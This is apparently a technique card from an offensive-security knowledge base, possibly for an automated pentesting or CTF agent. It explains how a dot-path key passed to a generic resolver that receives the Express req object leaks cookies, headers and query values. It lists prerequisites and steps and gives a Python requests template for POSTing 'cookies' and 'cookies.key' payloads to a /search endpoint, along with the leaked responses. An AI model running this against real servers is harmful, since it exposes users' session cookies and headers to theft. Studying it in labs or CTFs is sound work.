---
name: express_req_property_traversal_leak
vuln_type: information_disclosure
sub_technique: property_traversal
category: exploitation
safety_level: safe
---

# Express Req Object Property Traversal — Cookie/Header Leak

## When to Apply

The server passes user input (key) along with the Express req object to a getdata/resolve-style function. In a getdata(key, value, req) pattern, key = 'cookies.sessionId' etc. can access internal properties like req.cookies, req.headers, req.query.

## Prerequisites

- Server handler passes req object directly to a generic data resolver
- Key is split by dot (.) or delimiter for recursive access
- Blocklist for prototype/constructor does not include cookies, headers, etc.

## Steps

1. Analyze data resolver at /search endpoint — check if 3rd argument is `req`
2. Use dot-path in key for `getdata(key, value, data)`: `cookies.key`
3. If `value='*'`, enumerate all sub-properties; specific value returns that key only
4. When request includes cookies → leaked in response as `<p id=key>cookie_value</p>`
5. Other req properties (headers, query, body, etc.) are accessible the same way

## Code Template

```
import requests
# Leak all cookies
resp = requests.post('{url}/search',
    json={'query': {'cookies': '*'}},
    cookies={'key': 'secret_value'})
# Response: <p id=key>secret_value</p>

# Leak specific cookie char by char
resp = requests.post('{url}/search',
    json={'query': {'cookies.key': '*'}},
    cookies={'key': 'secret'})
# Response: <p id=0>s</p><p id=1>e</p>...
```

## Examples

### Example 1

- **endpoint**: /search
- **data_arg**: req (Express request object)
- **leaked_property**: req.cookies.key
- **key_payload**: cookies or cookies.key

Blocklist only contains __proto__, prototype, constructor — cookies, headers, query, etc. are not blocked. value='*' returns all properties; specifying a key returns that value only.
